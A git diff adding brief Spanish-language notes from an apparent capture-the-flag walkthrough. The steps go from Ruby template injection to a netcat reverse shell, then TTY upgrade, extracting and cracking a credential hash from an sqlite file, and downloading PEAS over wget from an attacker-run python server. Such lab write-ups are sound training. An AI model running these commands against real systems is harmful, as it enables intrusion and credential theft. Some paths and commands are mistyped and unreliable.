@@ -1,0 +1,28 @@
+kali- Al hacer un nmap obtenemos un servicio web abierto 
+- Entramos y vemos que hay unos recuadores de texto que devuelven texto 
+- Intento fallido de gobuster de conseguir directorios
+- Lanzan error de malicious input al intentar inyectar codigo
+- Comprobamos que la web usa ruby
+- copiamos un server-side-template-injection traducido a ruby
+- Usamos burpsuite para comprobar si podemos inyectar el ssti desde ahi ,convirtiendolo a URL encode keycharacter 
+- PARA NUEVA LINEA %0A
+- exito, por tanto iniciamso una escucha a un puerto (nc -lvnp 9001)
+- 'which+bash+' = /ust/bin/bash por tanto python3
+- which+python3 = /ust/bin/bash/python3
+- revshells.com descargamos para python3 y encodeamos a url
+- python3 -c 'import pty;pty.spawn/"/bin/bash")'
+- suspendemos 
+- stty raw -echo;fg
+- export TERM = xterm
+- cogemos el user.txt
+- vemos que hay un arhcivo con las credenciales
+- con file (archivo) vemos qeu tipo de archivo se trata
+- entramos con sqlite3 (archivo)
+- conseguimos hash intentamos crackearlo
+- fallo , con john y con hashcat , buscamos otra manera
+- creamos un servidor python3 : python3 -m http.server 9090
+- descargamos  desde la reverse shell con wget (http://ip:puerto/archivo) el PEAS
+- le damos permiso de ejecucion con chmod  +x
+- ejecutar PEAS y buscar por archivo importantes en este caso importante en MAIL
+- encontramos estructura de contraseña
+- con el hash previo : hashcat
